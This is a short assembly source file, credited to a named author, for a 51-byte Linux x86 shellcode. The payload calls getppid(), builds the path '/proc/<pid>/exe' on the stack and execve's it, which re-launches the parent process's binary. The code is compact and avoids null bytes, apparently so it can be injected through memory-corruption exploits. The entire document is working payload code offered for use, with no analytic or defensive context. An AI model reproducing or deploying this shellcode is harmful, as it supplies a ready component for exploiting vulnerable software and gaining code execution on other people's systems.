#
# (linux/x86) getppid() + execve("/proc/<pid>/exe", ["/proc/<pid>/exe", NULL]) - 51 bytes
# - Itzik Kotler <ik@ikotler.org>
#
# * thanks to pR for the _convert loop ;-)
#

.section .text
	.global _start
	_start:

		push $0x40
		popl %eax
		int $0x80

	_convert:

		decl %esp
		cdq
		pushl $0xa
		popl %ebx
		divl %ebx
		addb $0x30, %dl
		movb %dl, (%esp)
		testl %eax, %eax
		jnz _convert
		cdq
		popl %ebx
		pushl %edx
		pushl $0x6578652f
		pushl %ebx
		pushl $0x2f636f72
		pushl $0x702f2f2f
		movb $0xb, %al
		movl %esp, %ebx
		pushl %edx
		pushl %ebx
		movl %esp, %ecx
		int $0x80
